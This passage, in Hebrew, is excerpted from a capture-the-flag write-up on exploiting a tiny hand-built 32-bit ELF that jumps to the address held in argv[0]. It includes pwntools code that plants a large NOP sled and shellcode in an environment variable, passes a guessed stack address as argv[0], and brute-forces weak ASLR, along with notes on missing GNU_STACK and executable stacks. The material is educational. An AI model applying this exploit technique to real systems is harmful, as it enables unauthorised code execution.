...
pop eax        ; eax = argc          ; esp מתקדם ל-argv[0]
pop eax        ; eax = argv[0]       ; מצביע למחרוזת שם התוכנית
mov eax,[eax]  ; eax = *(argv[0])    ; ארבעת הבתים הראשונים של שם התוכנית
jmp eax        ; קופצים לכתובת הזו
```
...
pwndbg> ni
pwndbg> ni
pwndbg> ni      # אחרי mov eax,[eax]
pwndbg> p/x $eax
$1 = 0x69742e2e     # "./ti" - ארבעת הבתים הראשונים של "./tiny"
pwndbg> ni          # ה-jmp eax
...
env = {'PWN': b'\x90' * 0x10000 + sc}          # מזחלת ענקית + shellcode

target = 0xffffd800                            # כתובת עמוק בתוך המזחלת (מ-gdb)

p = process(['./tiny'], executable='./tiny',
            argv=[p32(target)], env=env)        # argv[0] = הכתובת
p.sendline(b'id')
print(p.recvline())
p.interactive()
```
...
context.clear(arch='i386')
context.log_level = 'error'          # שקט בזמן ה-brute force

sc = asm(shellcraft.i386.linux.sh())
env = {'PWN': b'\x90' * 0x10000 + sc}
target = 0xffffd800                  # ניחוש קבוע בתוך תחום המזחלת
...
איך להכליל: brute force מול ASLR חלש הוא כלי לגיטימי ומהיר. מזחלת גדולה + כתובת קבועה + לולאה מנצחים כמעט תמיד ב-32 ביט. ב-64 ביט האנטרופיה גבוהה מדי לגישה הזו, ושם צריך דליפת כתובת.
...
$ cp ~/tiny_easy .
$ objdump -d tiny_easy      # מאשרים pop/pop/mov/jmp על eax
```
...
1. **מדוע ELF מינימלי נותן מחסנית ניתנת להרצה.** קומפיילרים מודרניים תמיד מוסיפים מקטע `GNU_STACK` עם דגל `RW` (בלי `E`), שאומר לקרנל להשאיר את המחסנית לא-ניתנת-להרצה. בינארי מינימלי שנבנה ביד מדלג על המקטע הזה, והקרנל נופל ל-`READ_IMPLIES_EXEC` הישן שהופך כל דף קריא לניתן להרצה. אילו הבינארי היה כולל `GNU_STACK` עם `RW` בלבד, ה-shellcode בסביבה היה מקבל `SIGSEGV` בקפיצה, והיינו צריכים ROP או ret2libc במקום shellcode.

2. **מקורות קלט מוקדמים נוספים.** בבינארי כזה, כל מה שהקרנל שם על המחסנית בכניסה הוא בשליטה חלקית שלנו: `argv` (מספר וארגומנטים ותוכנם), `envp` (מספר משתני הסביבה, שמותיהם וערכיהם), וגם היסטים שנגזרים מהאורכים שלהם. גם `argv[0]` וגם משתני סביבה הם קלט "לפני main" שהתוקף קובע דרך `execve`. auxv נקבע על ידי הקרנל ופחות נשלט.
